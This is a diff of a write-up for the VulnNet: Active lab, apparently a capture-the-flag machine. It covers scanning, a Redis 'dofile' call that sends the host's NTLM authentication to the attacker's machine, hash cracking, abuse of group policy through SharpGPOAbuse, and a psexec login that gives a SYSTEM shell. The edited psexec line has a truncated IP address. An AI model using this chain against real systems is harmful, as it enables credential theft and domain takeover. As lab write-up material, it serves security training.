@@ -27,16 +27,12 @@ This writeup documents the penetration testing of the [**VulnNet: Active**](http
 # Information Gathering
 ------------------
 
-After identifying the target's IP address, we need to enumerate as  much information as possible about the host.
-
-A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
+After identifying the target's IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
 * TTL 64: Linux.
 * TTL 128: Windows.
 
-```bash
+```
 ❯ ping -c 1 10.10.234.191
-```
-```
 PING 10.10.234.191 (10.10.234.191) 56(84) bytes of data.
 64 bytes from 10.10.234.191: icmp_seq=1 ttl=127 time=56.2 ms
 
@@ -47,10 +43,8 @@ rtt min/avg/max/mdev = 56.229/56.229/56.229/0.000 ms
 
 In this case, the target seems to be a Windows machine. Let's perform some scans.
 
-```bash
+```
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.234.191 -oG allPorts
-```
-```
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 14:52 CET
 Initiating SYN Stealth Scan at 14:52
@@ -96,10 +90,8 @@ Nmap done: 1 IP address (1 host up) scanned in 40.27 seconds
            Raw packets sent: 196605 (8.651MB) | Rcvd: 44 (1.936KB)
 ```
 
-```bash
+```
 ❯ nmap -sCV -p53,135,139,445,464,6379,9389,49666,49667,49673,49674,49677,49701,49795 10.10.234.191 -oN targeted
-```
-```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 14:53 CET
 Nmap scan report for VULNNET-BC3TCK1.VULNNET.LOCAL (10.10.234.191)
 Host is up (0.055s latency).
@@ -135,10 +127,8 @@ Nmap done: 1 IP address (1 host up) scanned in 95.41 seconds
 
 Nmap found some open ports, but we can't determinate much more things from the output.
 
-```bash
+```
 ❯ nxc smb 10.10.234.191 -u 'guest' -p '' --shares
-```
-```
 SMB         10.10.234.191     445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
 SMB         10.10.234.191     445    VULNNET-BC3TCK1  [-] vulnnet.local\guest: STATUS_ACCOUNT_DISABLED
 ```
@@ -151,10 +141,8 @@ I'll add in my /etc/hosts file the following line:
 10.10.234.191 VULNNET-BC3TCK1.VULNNET.LOCAL VULNNET.LOCAL
 ```
 
-```bash
+```
 ❯ ./kerbrute_linux_amd64 userenum --dc VULNNET-BC3TCK1.VULNNET.LOCAL -d VULNNET.LOCAL /home/kali/labs/thm/AttacktiveDirectory/scripts/userlist.txt
-```
-```
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
@@ -172,10 +160,8 @@ Version: v1.0.3 (9dad6e1) - 11/08/25 - Ronnie Flathers @ropnop
 
 We can't get so much information bruteforcing kerberos to enumerate users.
 
-```bash
+```
 ❯ enum4linux -a 10.10.234.191
-```
-```
 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Nov  8 14:33:45 2025
 
  =========================================( Target Information )=========================================
@@ -212,10 +198,8 @@ At this point I was a bit stuck here. I reviewed nmap's output and saw this:
 
 So, Redis is a kind of a DB service. Let's try to focus on this service, since we can't do much with the SMB service and Kerberos port is not even open...
 
-```bash
+```
 ❯ redis-cli -h 10.10.234.191
-```
-```
 10.10.234.191:6379> config get *
 ...
 1) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
@@ -230,16 +214,14 @@ We found a user. Let's abuse redis to get the **NTLM hash** of this user.
 - I'll start responder with ``responder -I tun0`` in other terminal session to capture the NTLM hash
 - In the redis-cli session I have, I'll run the following command to force the user ``enterprise-security`` to access a file called *test* that doesn't exist.
 
-```bash
+```
 eval "dofile('//10.8.78.182/test')" 0
 ```
 
 Once we have captured the **NTLM hash** of the ``enterprise-secutiry`` user we need to **crack it**.
 
-```bash
+```
 ❯ john -w:/usr/share/wordlists/rockyou.txt hash
-```
-```
 Using default input encoding: UTF-8
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 Will run 7 OpenMP threads
@@ -252,10 +234,8 @@ Session completed.
 
 Now that we have valid credentials in the domain, we can try to list shared resources with ``smbclient.py``
 
-```bash
+```
 ❯ smbclient -L //10.10.234.191 -U enterprise-security
-```
-```
 Password for [WORKGROUP\enterprise-security]:
 
 	Sharename       Type      Comment
@@ -311,10 +291,8 @@ We can use SharpGPOAbuse.
 
 I'll download [SharpexeGPOAbuse.exe](https://github.com/FSecureLABS/SharpGPOAbuse) and update the group policies on the target machine:
 
-```powershell
+```
 PS C:\Enterprise-Share> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
-```
-```
 [+] Domain = vulnnet.local
 [+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
 [+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
@@ -338,10 +316,8 @@ The enterprise-security user has GenericWrite over the GPO `SECURITY-POL-VN`, wh
 
 Now I'll cccess the machine with the new privileges and finally, you'll find the system flag in Administrator's desktop
 
-```bash
-❯ psexec.py enterprise-security:sand_0873959498@10.10.234.191
 ```
-```
+❯ psexec.py enterprise-security:sand_0873959498@10.10.234.19
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Requesting shares on 10.10.234.191.....
@@ -353,17 +329,9 @@ Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 [!] Press help for extra shell commands
 Microsoft Windows [Version 10.0.17763.1757]
 (c) 2018 Microsoft Corporation. All rights reserved.
-```
-```powershell
 C:\Windows\system32> whoami
-```
-```
 nt authority\system
-```
-```powershell
 C:\Windows\system32> type C:\Users\Administrator\Desktop\system.txt
-```
-```
 ***REDACTED***
 ```
 
